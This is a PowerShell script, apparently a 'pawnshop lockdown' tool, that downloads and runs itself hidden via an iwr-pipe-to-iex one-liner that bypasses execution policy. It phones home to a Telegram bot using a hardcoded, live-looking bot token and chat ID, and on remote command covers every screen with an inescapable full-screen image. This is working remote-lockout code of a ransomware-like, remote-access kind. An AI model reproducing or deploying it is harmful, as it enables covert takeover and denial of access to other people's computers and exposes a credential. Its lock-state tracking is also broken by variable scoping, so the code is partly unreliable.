# =========================================
# Pawnshop Lockdown – v1.0 Stable Working
# Supports /lockUser, /unlockUser, /statusUser
# Run via: 
#   powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iwr https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1 | iex"
# =========================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- CONFIGURATION ---
$botToken   = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
$chatID     = 656189986
$user       = $env:USERNAME
$pc         = $env:COMPUTERNAME
$lockCmd    = "/lock$user".ToLower()
$unlockCmd  = "/unlock$user".ToLower()
$statusCmd  = "/status$user".ToLower()
$imageURL   = 'https://raw.githubusercontent.com/diezul/x/main/1.png'
$tempImage  = "$env:TEMP\pawnlock.jpg"

# --- DOWNLOAD LOCK SCREEN IMAGE ---
try {
    Invoke-WebRequest -Uri $imageURL -OutFile $tempImage -UseBasicParsing
} catch {}

# --- TELEGRAM SENDER ---
function Send-TG($text) {
    $payload = @{ chat_id = $chatID; text = $text } | ConvertTo-Json -Compress
    try {
        Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" `
            -Method POST -Body $payload -ContentType 'application/json'
    } catch {}
}

# --- UI SETUP ---
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms = $null

function Lock-Screen {
    if ($forms) { return }
    $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
        $f = New-Object Windows.Forms.Form -Property @{
            FormBorderStyle = 'None'
            WindowState     = 'Maximized'
            StartPosition   = 'Manual'
            TopMost         = $true
            Location        = $screen.Bounds.Location
            Size            = $screen.Bounds.Size
            BackColor       = 'Black'
            Cursor          = [Windows.Forms.Cursors]::None
        }
        $pb = New-Object Windows.Forms.PictureBox -Property @{
            Image    = [System.Drawing.Image]::FromFile($tempImage)
            Dock     = 'Fill'
            SizeMode = 'StretchImage'
        }
        $f.Controls.Add($pb)
        $f.Add_Deactivate({ $_.Activate() })
        $f.Show()
        $f
    }
    Send-TG "🔒 $pc is now LOCKED. Send $unlockCmd to unlock."
}

function Unlock-Screen {
    if (-not $forms) { return }
    foreach ($f in $forms) {
        try { $f.Close() } catch {}
    }
    $forms = $null
    Send-TG "⚠️ $pc is now UNLOCKED. Send $lockCmd to lock again."
}

# --- INITIAL STATUS MESSAGE ---
Send-TG "✅ $pc online. Commands: $lockCmd | $unlockCmd | $statusCmd"

# --- TELEGRAM POLLING LOOP ---
$offset = 0
try {
    $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=1" -TimeoutSec 5
    if ($init.result.Count -gt 0) {
        $offset = ($init.result | Select-Object -Last 1).update_id + 1
    }
} catch {}

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 3000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset" -TimeoutSec 5
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            $msg = $u.message.text.ToLower().Trim()
            if ($u.message.chat.id -ne [int]$chatID) { continue }
            switch ($msg) {
                $lockCmd   { Lock-Screen }
                $unlockCmd { Unlock-Screen }
                $statusCmd { 
                    $state = if ($forms) { '🔒 LOCKED' } else { '🟢 UNLOCKED' }
                    Send-TG "Status of $pc: $state"
                }
            }
        }
    } catch {}
})
$timer.Start()

# --- KEEP ALIVE ---
[System.Windows.Forms.Application]::Run()
